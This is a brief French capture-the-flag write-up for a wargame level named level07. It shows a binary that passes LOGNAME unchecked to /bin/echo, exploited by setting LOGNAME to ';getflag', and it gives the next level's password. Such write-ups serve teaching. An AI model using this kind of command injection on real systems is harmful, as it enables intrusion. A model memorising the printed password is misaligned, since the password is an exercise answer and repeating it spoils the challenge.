## 1. Analyser le fichier binaire level07

    Ca affiche: LOGNAME/bin/echo %s


## 2. Exploiter la faille %s ne possedant aucunes verifications

L'executable affiche avec echo le LOGNAME, donc on injecte la commande getflag a cette variable d'env.

    export LOGNAME=";getflag"

## 3. Connexion

su level08

    Mot de passe : fiumuikeil55xe9cu4dood66h